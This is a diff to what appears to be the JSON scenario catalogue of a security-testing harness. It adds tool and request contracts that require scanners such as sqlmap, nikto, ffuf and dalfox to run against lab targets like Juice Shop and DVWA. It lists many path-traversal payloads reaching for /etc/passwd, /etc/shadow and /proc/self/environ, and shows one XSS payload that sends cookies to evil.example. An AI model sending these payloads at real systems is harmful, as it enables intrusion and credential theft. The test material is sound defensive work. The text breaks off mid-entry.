@@ -347,6 +347,16 @@
             }
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -418,6 +428,16 @@
             "payload_class": "hidden-parameter-discovery",
             "minimum_dispatches": 1,
             "query_regex": ".+=.+"
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "arjun-invocation",
+            "tool": "arjun",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
           }
         ]
       }
@@ -1627,6 +1647,16 @@
             "path": "/dvwa/",
             "payload_class": "api-method-fuzzing",
             "minimum_dispatches": 1
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "ffuf-invocation",
+            "tool": "ffuf",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
           }
         ]
       }
@@ -8615,7 +8645,76 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "scan-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "sqlmap-injection-probe",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            },
+            "query_regex": "(?i)(UNION|AND|OR|%27)"
+          },
+          {
+            "id": "scan-1",
+            "method": "POST",
+            "path": "/juice-shop/rest/user/login",
+            "payload_class": "sqlmap-injection-probe",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            },
+            "body_regex": "(?i)(UNION|AND|OR|\\x27|SLEEP)"
+          },
+          {
+            "id": "scan-2",
+            "method": "GET",
+            "path": "/juice-shop/rest/track-order/test",
+            "payload_class": "sqlmap-injection-probe",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            },
+            "query_regex": "(?i)(UNION|AND|OR|%27)"
+          },
+          {
+            "id": "scan-3",
+            "method": "POST",
+            "path": "/juice-shop/api/Feedbacks/",
+            "payload_class": "sqlmap-injection-probe",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            },
+            "body_regex": "(?i)(UNION|AND|OR|\\x27|SLEEP)"
+          },
+          {
+            "id": "scan-4",
+            "method": "POST",
+            "path": "/juice-shop/api/Users/",
+            "payload_class": "sqlmap-injection-probe",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            },
+            "body_regex": "(?i)(UNION|AND|OR|\\x27|SLEEP)"
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
+      }
     },
     {
       "id": "malicious-user/01-identified-violations",
@@ -10322,6 +10421,34 @@
             "minimum_dispatches": 1
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "arjun-invocation",
+            "tool": "arjun",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          },
+          {
+            "id": "ffuf-invocation",
+            "tool": "ffuf",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          },
+          {
+            "id": "gobuster-invocation",
+            "tool": "gobuster",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          },
+          {
+            "id": "nikto-invocation",
+            "tool": "nikto",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -10452,6 +10579,16 @@
             "payload_class": "hydra-password-guessing",
             "minimum_dispatches": 2,
             "query_regex": "username=admin&password=.+&Login=Login"
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
           }
         ]
       }
@@ -10805,6 +10942,16 @@
             "minimum_dispatches": 1
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -10983,6 +11130,22 @@
             "minimum_dispatches": 1
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "arjun-invocation",
+            "tool": "arjun",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          },
+          {
+            "id": "ffuf-invocation",
+            "tool": "ffuf",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -11135,6 +11298,16 @@
             "minimum_dispatches": 1
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -11206,7 +11379,53 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "application-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-2",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-3",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-4",
+            "method": "GET",
+            "path": "/httpbin/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-5",
+            "method": "GET",
+            "path": "/csd-demo/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "owasp-scanning/02-zap-active-scan",
@@ -11219,7 +11438,53 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "application-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-2",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-3",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-4",
+            "method": "GET",
+            "path": "/httpbin/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "application-5",
+            "method": "GET",
+            "path": "/csd-demo/",
+            "payload_class": "zap-spider-navigation",
+            "minimum_dispatches": 1
+          }
+        ]
+      }
     },
     {
       "id": "owasp-scanning/03-nikto-full",
@@ -11296,6 +11561,16 @@
             }
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "nikto-invocation",
+            "tool": "nikto",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -11309,7 +11584,61 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "template-0",
+            "method": "GET",
+            "path": "/",
+            "payload_class": "nuclei-technology-template",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            }
+          },
+          {
+            "id": "template-1",
+            "method": "GET",
+            "path": "/juice-shop/",
+            "payload_class": "nuclei-technology-template",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            }
+          },
+          {
+            "id": "template-2",
+            "method": "GET",
+            "path": "/dvwa/",
+            "payload_class": "nuclei-technology-template",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            }
+          },
+          {
+            "id": "template-3",
+            "method": "GET",
+            "path": "/vampi/",
+            "payload_class": "nuclei-technology-template",
+            "minimum_dispatches": 1,
+            "header_regex": {
+              "user-agent": ".+"
+            }
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "nuclei-invocation",
+            "tool": "nuclei",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
+      }
     },
     {
       "id": "owasp-scanning/05-nmap-vuln-scan",
@@ -11403,6 +11732,16 @@
               "user-agent": "(?i)sqlmap"
             },
             "body_regex": "(?i)(SELECT|UNION|AND|OR|SLEEP|\\x27)"
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
           }
         ]
       }
@@ -12507,6 +12846,16 @@
             "minimum_dispatches": 1
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "ffuf-invocation",
+            "tool": "ffuf",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -12520,7 +12869,77 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "xss-probe-0",
+            "method": "GET",
+            "path": "/juice-shop/rest/products/search",
+            "payload_class": "dalfox-parameter-probe",
+            "minimum_dispatches": 1,
+            "query_regex": ".+=.+"
+          },
+          {
+            "id": "xss-probe-2",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_r/",
+            "payload_class": "dalfox-parameter-probe",
+            "minimum_dispatches": 1,
+            "query_regex": ".+=.+"
+          },
+          {
+            "id": "xss-probe-3",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_s/",
+            "payload_class": "dalfox-parameter-probe",
+            "minimum_dispatches": 1,
+            "query_regex": ".+=.+"
+          },
+          {
+            "id": "xss-probe-4",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/sqli/",
+            "payload_class": "dalfox-parameter-probe",
+            "minimum_dispatches": 1,
+            "query_regex": ".+=.+"
+          },
+          {
+            "id": "xss-probe-5",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/xss_d/",
+            "payload_class": "dalfox-parameter-probe",
+            "minimum_dispatches": 1,
+            "query_regex": ".+=.+"
+          },
+          {
+            "id": "xss-probe-6",
+            "method": "GET",
+            "path": "/httpbin/get",
+            "payload_class": "dalfox-parameter-probe",
+            "minimum_dispatches": 1,
+            "query_regex": ".+=.+"
+          },
+          {
+            "id": "xss-probe-7",
+            "method": "GET",
+            "path": "/csd-demo/",
+            "payload_class": "dalfox-parameter-probe",
+            "minimum_dispatches": 1,
+            "query_regex": ".+=.+"
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "dalfox-invocation",
+            "tool": "dalfox",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
+      }
     },
     {
       "id": "owasp-scanning/09-arjun-param-discovery",
@@ -12631,6 +13050,16 @@
             "payload_class": "arjun-hidden-parameter-probe",
             "minimum_dispatches": 1,
             "query_regex": ".+=.+"
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "arjun-invocation",
+            "tool": "arjun",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
           }
         ]
       }
@@ -13375,6 +13804,16 @@
             "minimum_dispatches": 1
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "gobuster-invocation",
+            "tool": "gobuster",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -13600,6 +14039,16 @@
             "path": "/graphql",
             "payload_class": "directory-wordlist-probe",
             "minimum_dispatches": 1
+          }
+        ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "feroxbuster-invocation",
+            "tool": "feroxbuster",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
           }
         ]
       }
@@ -18521,6 +18970,16 @@
             }
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -20594,6 +21053,16 @@
             }
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "sqlmap-invocation",
+            "tool": "sqlmap",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -20947,6 +21416,16 @@
             "body_exact": "txtName=attacker&mtxMessage=%22%3E%3Cimg%20src%3Dx%20onerror%3Dfetch%28%22https%3A//evil.example/steal%3Fc%3D%22%2Bdocument.cookie%29%3E&btnSign=Sign+Guestbook"
           }
         ]
+      },
+      "tool_contract": {
+        "requirements": [
+          {
+            "id": "dalfox-invocation",
+            "tool": "dalfox",
+            "argument_regex": "(juice-shop|dvwa|vampi|httpbin|https?://)",
+            "minimum": 1
+          }
+        ]
       }
     },
     {
@@ -21205,7 +21684,866 @@
       "expected_outcome": "meaningful simulation launch; mitigation permitted; fixture, tool, transport failures fail",
       "budget": "http",
       "parallel": false,
-      "timeout_seconds": 900
+      "timeout_seconds": 900,
+      "dispatch_contract": {
+        "requirements": [
+          {
+            "id": "traversal-0",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-1",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-2",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-3",
+            "method": "GET",
+            "path": "/etc/passwd",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-4",
+            "method": "GET",
+            "path": "/etc/shadow",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-5",
+            "method": "GET",
+            "path": "/etc/hosts",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-6",
+            "method": "GET",
+            "path": "/proc/self/environ",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-7",
+            "method": "GET",
+            "path": "/windows/system32/drivers/etc/hosts",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-8",
+            "method": "GET",
+            "path": "/juice-shop/ftp/..%2F..%2F..%2Fetc%2Fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-9",
+            "method": "GET",
+            "path": "/juice-shop/ftp/..%252F..%252F..%252Fetc%252Fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-10",
+            "method": "GET",
+            "path": "/juice-shop/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-11",
+            "method": "GET",
+            "path": "/juice-shop/ftp/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-12",
+            "method": "GET",
+            "path": "/juice-shop/ftp/..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-13",
+            "method": "GET",
+            "path": "/juice-shop/ftp/..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-14",
+            "method": "GET",
+            "path": "/juice-shop/ftp/../../../etc/passwd%00",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-15",
+            "method": "GET",
+            "path": "/juice-shop/ftp/../../../etc/passwd%00.jpg",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-16",
+            "method": "GET",
+            "path": "/juice-shop/ftp/../../../etc/passwd%00.html",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-17",
+            "method": "GET",
+            "path": "/juice-shop/ftp/....//....//....//etc/passwd",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-18",
+            "method": "GET",
+            "path": "/juice-shop/ftp/....//../....//../....//../etc/passwd",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1
+          },
+          {
+            "id": "traversal-19",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-20",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-21",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-22",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-23",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./etc/shadow$"
+          },
+          {
+            "id": "traversal-24",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./etc/hosts$"
+          },
+          {
+            "id": "traversal-25",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./proc/self/environ$"
+          },
+          {
+            "id": "traversal-26",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./windows/system32/drivers/etc/hosts$"
+          },
+          {
+            "id": "traversal-27",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\.%2F\\.\\.%2F\\.\\.%2Fetc%2Fpasswd$"
+          },
+          {
+            "id": "traversal-28",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\.%252F\\.\\.%252F\\.\\.%252Fetc%252Fpasswd$"
+          },
+          {
+            "id": "traversal-29",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=%2e%2e/%2e%2e/%2e%2e/etc/passwd$"
+          },
+          {
+            "id": "traversal-30",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd$"
+          },
+          {
+            "id": "traversal-31",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\.%c0%af\\.\\.%c0%af\\.\\.%c0%afetc%c0%afpasswd$"
+          },
+          {
+            "id": "traversal-32",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\.%ef%bc%8f\\.\\.%ef%bc%8f\\.\\.%ef%bc%8fetc%ef%bc%8fpasswd$"
+          },
+          {
+            "id": "traversal-33",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./etc/passwd%00$"
+          },
+          {
+            "id": "traversal-34",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./etc/passwd%00\\.jpg$"
+          },
+          {
+            "id": "traversal-35",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\./\\.\\./\\.\\./etc/passwd%00\\.html$"
+          },
+          {
+            "id": "traversal-36",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\.\\.\\.//\\.\\.\\.\\.//\\.\\.\\.\\.//etc/passwd$"
+          },
+          {
+            "id": "traversal-37",
+            "method": "GET",
+            "path": "/dvwa/vulnerabilities/fi/",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^page=\\.\\.\\.\\.//\\.\\./\\.\\.\\.\\.//\\.\\./\\.\\.\\.\\.//\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-38",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-39",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-40",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-41",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-42",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./etc/shadow$"
+          },
+          {
+            "id": "traversal-43",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./etc/hosts$"
+          },
+          {
+            "id": "traversal-44",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./proc/self/environ$"
+          },
+          {
+            "id": "traversal-45",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./windows/system32/drivers/etc/hosts$"
+          },
+          {
+            "id": "traversal-46",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\.%2F\\.\\.%2F\\.\\.%2Fetc%2Fpasswd$"
+          },
+          {
+            "id": "traversal-47",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\.%252F\\.\\.%252F\\.\\.%252Fetc%252Fpasswd$"
+          },
+          {
+            "id": "traversal-48",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=%2e%2e/%2e%2e/%2e%2e/etc/passwd$"
+          },
+          {
+            "id": "traversal-49",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd$"
+          },
+          {
+            "id": "traversal-50",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\.%c0%af\\.\\.%c0%af\\.\\.%c0%afetc%c0%afpasswd$"
+          },
+          {
+            "id": "traversal-51",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-encoded_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\.%ef%bc%8f\\.\\.%ef%bc%8f\\.\\.%ef%bc%8fetc%ef%bc%8fpasswd$"
+          },
+          {
+            "id": "traversal-52",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./etc/passwd%00$"
+          },
+          {
+            "id": "traversal-53",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./etc/passwd%00\\.jpg$"
+          },
+          {
+            "id": "traversal-54",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\./\\.\\./\\.\\./etc/passwd%00\\.html$"
+          },
+          {
+            "id": "traversal-55",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\.\\.\\.//\\.\\.\\.\\.//\\.\\.\\.\\.//etc/passwd$"
+          },
+          {
+            "id": "traversal-56",
+            "method": "GET",
+            "path": "/api/files",
+            "payload_class": "path-traversal-nullbyte_payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^path=\\.\\.\\.\\.//\\.\\./\\.\\.\\.\\.//\\.\\./\\.\\.\\.\\.//\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-57",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-58",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
+            "query_regex": "^file=\\.\\./\\.\\./\\.\\./\\.\\./etc/passwd$"
+          },
+          {
+            "id": "traversal-59",
+            "method": "GET",
+            "path": "/download",
+            "payload_class": "path-traversal-payloads",
+            "minimum_dispatches": 1,
